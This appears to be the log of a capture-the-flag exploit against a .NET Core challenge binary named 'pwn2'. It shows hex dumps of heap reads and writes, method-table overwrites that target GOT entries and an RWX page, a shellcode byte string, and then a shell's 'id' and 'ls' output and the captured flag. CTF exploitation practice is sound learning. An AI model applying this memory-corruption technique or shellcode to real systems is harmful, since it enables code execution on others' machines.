Add(0x1f)
Add(0x1e)
Write(1,0x0) <<
00000000: a4b8 2854 0e4d b853 6e3e c2d5 ace1 b545  ..(T.M.Sn>.....E
00000010: 611f cca3 2e98 9261 d327 5d80 1689 b000  a......a.'].....
00000020: 0000 0000 0000 0000 c014 ac45 aa7f 0000  ...........E....
00000030: 0100 0000 0000 0000 0100 0000 0000 0000  ................
00000040: 0000 0000 0000 0000 c014 ac45 aa7f 0000  ...........E....
00000050: 0100 0000 0000 0000 1e00 0000 0000 0000  ................
00000060: 0000 0000 0000 0000 8812 bc45 aa7f 0000  ...........E....
00000070: a891 0020 aa7f 0000 0000 0000 0000 0000  ... ............
00000080: c014 ac45 aa7f 0000 1e00 0000 0000 0000  ...E............
00000090: 6f82 6094 8909 f03a 2cd3 19be a022 a647  o.`....:,....".G
000000a0: 7b65 c751 e3f7 40e8 0c25 c680 e7ef 0000  {e.Q..@..%......
000000b0: 0000 0000 0000 0000 c014 ac45 aa7f 0000  ...........E....
000000c0: 0100 0000 0000 0000 0200 0000 0000 0000  ................
000000d0: 0000 0000 0000 0000 c014 ac45 aa7f 0000  ...........E....
000000e0: 0100 0000 0000 0000 0100 0000 0000 0000  ................

Overwrite the MT in FastByteArray[2]
... with pwn2 GOT
Read(1,0x70) >> b'0040610000000000'
Write(2,0x0) <<
00000000: 00b5 d2bf aa7f 0000 c07d c3bf aa7f 0000  .........}......
00000010: b62b 4000 0000 0000 c62b 4000 0000 0000  .+@......+@.....
00000020: d62b 4000 0000 0000 3041 c7bf aa7f 0000  .+@.....0A......
00000030: f62b 4000 0000 0000 062c 4000 0000 0000  .+@......,@.....
00000040: 162c 4000 0000 0000 906f c3bf aa7f 0000  .,@......o......
00000050: 362c 4000 0000 0000 462c 4000 0000 0000  6,@.....F,@.....
00000060: 562c 4000 0000 0000 662c 4000 0000 0000  V,@.....f,@.....
00000070: 762c 4000 0000 0000 6072 bfbf aa7f 0000  v,@.....`r......
00000080: 607b c3bf aa7f 0000 b064 c3bf aa7f 0000  `{.......d......
00000090: b62c 4000 0000 0000 c62c 4000 0000 0000  .,@......,@.....
000000a0: d62c 4000 0000 0000 2089 c0bf aa7f 0000  .,@..... .......
000000b0: f62c 4000 0000 0000 e081 87bf aa7f 0000  .,@.............
000000c0: b0bf 82bf aa7f 0000 262d 4000 0000 0000  ........&-@.....
000000d0: 362d 4000 0000 0000 462d 4000 0000 0000  6-@.....F-@.....
000000e0: 562d 4000 0000 0000 662d 4000 0000 0000  V-@.....f-@.....

address: 7faabfc37dc0
Overwrite the MT in FastByteArray[2]
... with a RWX page
Read(1,0x70) >> b'00c010bfaa7f0000'
Write(2,0x0) <<
00000000: 7200 7200 6500 6e00 7400 5600 6500 7200  r.r.e.n.t.V.e.r.
00000010: 7300 6900 6f00 6e00 5c00 4100 6500 4400  s.i.o.n.\.A.e.D.
00000020: 6500 6200 7500 6700 0000 0000 0000 0000  e.b.u.g.........
00000030: 4400 6500 6200 7500 6700 6700 6500 7200  D.e.b.u.g.g.e.r.
00000040: 0000 4100 7500 7400 6f00 0000 0000 0000  ..A.u.t.o.......
00000050: 5300 4f00 4600 5400 5700 4100 5200 4500  S.O.F.T.W.A.R.E.
00000060: 5c00 4d00 6900 6300 7200 6f00 7300 6f00  \.M.i.c.r.o.s.o.
00000070: 6600 7400 5c00 5700 6900 6e00 6400 6f00  f.t.\.W.i.n.d.o.
00000080: 7700 7300 2000 4e00 5400 5c00 4300 7500  w.s. .N.T.\.C.u.
00000090: 7200 7200 6500 6e00 7400 5600 6500 7200  r.r.e.n.t.V.e.r.
000000a0: 7300 6900 6f00 6e00 5c00 4100 6500 4400  s.i.o.n.\.A.e.D.
000000b0: 6500 6200 7500 6700 5c00 4100 7500 7400  e.b.u.g.\.A.u.t.
000000c0: 6f00 4500 7800 6300 6c00 7500 7300 6900  o.E.x.c.l.u.s.i.
000000d0: 6f00 6e00 4c00 6900 7300 7400 0000 0000  o.n.L.i.s.t.....
000000e0: ed34 0fce c6bb d211 941e 0000 f808 3460  .4............4`

Read(2,0x0) >> b'31c048bbd19d9691d08c97ff48f7db53545f995257545eb03b0f05'
Overwrite the MT in FastByteArray[2]
... with System.Native GOT
Read(1,0x70) >> b'0050bebbaa7f0000'
Write(2,0x0) <<
00000000: 00b5 d2bf aa7f 0000 c6b4 9dbb aa7f 0000  ................
00000010: d6b4 9dbb aa7f 0000 e6b4 9dbb aa7f 0000  ................
00000020: f6b4 9dbb aa7f 0000 06b5 9dbb aa7f 0000  ................
00000030: 16b5 9dbb aa7f 0000 26b5 9dbb aa7f 0000  ........&.......
00000040: 36b5 9dbb aa7f 0000 46b5 9dbb aa7f 0000  6.......F.......
00000050: 56b5 9dbb aa7f 0000 66b5 9dbb aa7f 0000  V.......f.......
00000060: 76b5 9dbb aa7f 0000 86b5 9dbb aa7f 0000  v...............
00000070: 96b5 9dbb aa7f 0000 a6b5 9dbb aa7f 0000  ................
00000080: b6b5 9dbb aa7f 0000 c6b5 9dbb aa7f 0000  ................
00000090: d6b5 9dbb aa7f 0000 0004 d0bf aa7f 0000  ................
000000a0: 6004 d0bf aa7f 0000 06b6 9dbb aa7f 0000  `...............
000000b0: 16b6 9dbb aa7f 0000 26b6 9dbb aa7f 0000  ........&.......
000000c0: 36b6 9dbb aa7f 0000 46b6 9dbb aa7f 0000  6.......F.......
000000d0: 56b6 9dbb aa7f 0000 66b6 9dbb aa7f 0000  V.......f.......
000000e0: 76b6 9dbb aa7f 0000 86b6 9dbb aa7f 0000  v...............

write address: 0x7faabfd00460
Write(2,0xf0) <<
00000000: 96b6 9dbb aa7f 0000 a6b6 9dbb aa7f 0000  ................
00000010: b6b6 9dbb aa7f 0000 c6b6 9dbb aa7f 0000  ................
00000020: d6b6 9dbb aa7f 0000 e6b6 9dbb aa7f 0000  ................
00000030: f6b6 9dbb aa7f 0000 06b7 9dbb aa7f 0000  ................
00000040: 16b7 9dbb aa7f 0000 26b7 9dbb aa7f 0000  ........&.......
00000050: 36b7 9dbb aa7f 0000 46b7 9dbb aa7f 0000  6.......F.......
00000060: 56b7 9dbb aa7f 0000 66b7 9dbb aa7f 0000  V.......f.......
00000070: 76b7 9dbb aa7f 0000 86b7 9dbb aa7f 0000  v...............
00000080: 96b7 9dbb aa7f 0000 a6b7 9dbb aa7f 0000  ................
00000090: b6b7 9dbb aa7f 0000 c6b7 9dbb aa7f 0000  ................
000000a0: d6b7 9dbb aa7f 0000 e6b7 9dbb aa7f 0000  ................
000000b0: f6b7 9dbb aa7f 0000 06b8 9dbb aa7f 0000  ................
000000c0: 16b8 9dbb aa7f 0000 26b8 9dbb aa7f 0000  ........&.......
000000d0: 36b8 9dbb aa7f 0000 46b8 9dbb aa7f 0000  6.......F.......
000000e0: 56b8 9dbb aa7f 0000 0005 d0bf aa7f 0000  V...............

read address: 0x7faabfd00500
Read(2,0xa0) >> b'10c010bfaa7f0000'
uid=8888(ctf) gid=8888(ctf) groups=8888(ctf)

total 116
-rwxr-xr-x 1 root root    59 Dec  5 17:26 flag.txt
-rwxr-xr-x 1 root root 86584 Dec  8 11:55 pwn2
-rwxr-xr-x 1 root root   382 Dec  8 11:55 pwn2.deps.json
-rwxr-xr-x 1 root root  5632 Dec  8 11:55 pwn2.dll
-rwxr-xr-x 1 root root  1016 Dec  8 11:55 pwn2.pdb
-rwxr-xr-x 1 root root   139 Dec  8 11:55 pwn2.runtimeconfig.dev.json
-rwxr-xr-x 1 root root   146 Dec  8 11:55 pwn2.runtimeconfig.json

AOTW{1snt_c0rrupt1nG_manAgeD_M3m0ry_easier_than_y0u_th1nk?}
{
  "runtimeOptions": {
    "additionalProbingPaths": [
      "/root/.dotnet/store/|arch|/|tfm|",
      "/root/.nuget/packages"
    ]
  }
}
{
  "runtimeOptions": {
    "tfm": "netcoreapp3.0",
    "framework": {
      "name": "Microsoft.NETCore.App",
      "version": "3.0.0"
    }
  }
}
```
